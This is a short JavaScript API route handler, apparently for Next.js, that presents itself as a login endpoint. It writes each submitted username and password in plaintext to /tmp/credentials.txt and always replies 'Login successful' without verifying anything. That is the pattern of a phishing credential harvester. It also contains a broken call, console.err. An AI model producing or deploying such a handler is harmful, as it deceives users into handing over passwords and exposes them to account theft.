import fs from "fs";

export default async function handler(req, res) {
  if (req.method === "POST") {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}`;

    try {
      fs.appendFileSync("/tmp/credentials.txt", data);
      res.status(200).send("Login successful");
    } catch (err) {
      console.err(err);
      res.status(500).send("Error saving data");
    }
  } else {
    res.status(405).send("Not allowed");
  }
}
